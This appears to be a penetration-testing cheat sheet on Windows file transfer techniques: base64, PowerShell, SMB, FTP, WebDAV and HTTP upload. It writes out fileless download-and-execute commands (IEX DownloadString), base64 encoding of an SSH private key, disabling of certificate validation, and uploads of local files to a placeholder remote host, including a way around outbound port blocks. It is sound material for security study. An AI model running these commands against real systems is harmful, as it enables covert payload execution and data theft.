# Windows File Transfers

## Downloads

### Base64 (No Network)

```bash
# Linux: check hash, encode
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

```powershell
# Windows: decode and write
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64>"))

# Verify hash matches
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

> ⚠️ cmd.exe max string length = 8,191 chars — use PowerShell for large files.

---

### PowerShell HTTP/HTTPS

```powershell
# DownloadFile (writes to disk)
(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe', 'C:\Users\Public\file.exe')
(New-Object Net.WebClient).DownloadFileAsync('http://<IP>/file.exe', 'C:\Users\Public\file.exe')

# DownloadString (fileless — runs in memory)
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1') | IEX

# Invoke-WebRequest (PS 3.0+, slower)
Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe
```

**Common errors:**

```powershell
# IE first-launch not completed
Invoke-WebRequest http://<IP>/file.ps1 -UseBasicParsing | IEX

# Untrusted SSL cert
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

### SMB

```bash
# Linux: start SMB server (unauthenticated)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Linux: start SMB server (authenticated — needed on modern Windows)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
:: Windows: copy from share (unauthenticated)
copy \\<IP>\share\nc.exe

:: Windows: mount share with creds then copy
net use n: \\<IP>\share /user:test test
copy n:\nc.exe
```

---

### FTP

```bash
# Linux: start FTP server (anon, port 21)
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
# Windows: download via PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', 'C:\Users\Public\file.txt')
```

```cmd
:: Windows: non-interactive FTP (no shell)
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Uploads

### Base64 (No Network)

```powershell
# Windows: encode file
[Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Get-FileHash 'C:\Windows\System32\drivers\etc\hosts' -Algorithm MD5
```

```bash
# Linux: decode and verify
echo <BASE64> | base64 -d > hosts
md5sum hosts
```

---

### HTTP Upload (uploadserver)

```bash
# Linux: start upload server
pip3 install uploadserver
python3 -m uploadserver       # listens on :8000, accepts POST to /upload
```

```powershell
# Windows: upload via PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**Alternative — base64 POST to Netcat:**

```powershell
# Windows: encode and POST
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64
```

```bash
# Linux: catch with nc, decode
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > file
```

---

### SMB Upload (WebDAV)

Use when SMB (TCP/445) is blocked outbound — WebDAV tunnels SMB over HTTP/HTTPS.

```bash
# Linux: start WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
:: Windows: browse or upload to share
dir \\<IP>\DavWWWRoot
copy C:\Users\john\file.zip \\<IP>\DavWWWRoot\
copy C:\Users\john\file.zip \\<IP>\sharefolder\
```

> **DavWWWRoot** is a Windows shell keyword meaning "root of the WebDAV server" — no folder with that name needs to exist.

---

### FTP Upload

```bash
# Linux: start FTP server with write enabled
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Windows: upload via PowerShell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

```cmd
:: Windows: non-interactive FTP upload
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Quick Reference

| Method | Direction | Needs Network | Notes |
|---|---|---|---|
| Base64 encode/decode | Both | No | Terminal-only; limited by string length in cmd |
| PowerShell WebClient | Down | Yes | Most reliable; supports HTTP/HTTPS/FTP |
| PowerShell IEX | Down | Yes | Fileless — runs in memory, never touches disk |
| SMB (impacket) | Both | Yes | Use auth on modern Windows |
| SMB over WebDAV | Both | Yes | Bypasses TCP/445 outbound blocks |
| FTP (pyftpdlib) | Both | Yes | Non-interactive mode for restricted shells |
| uploadserver POST | Up | Yes | Python HTTP server with upload support |
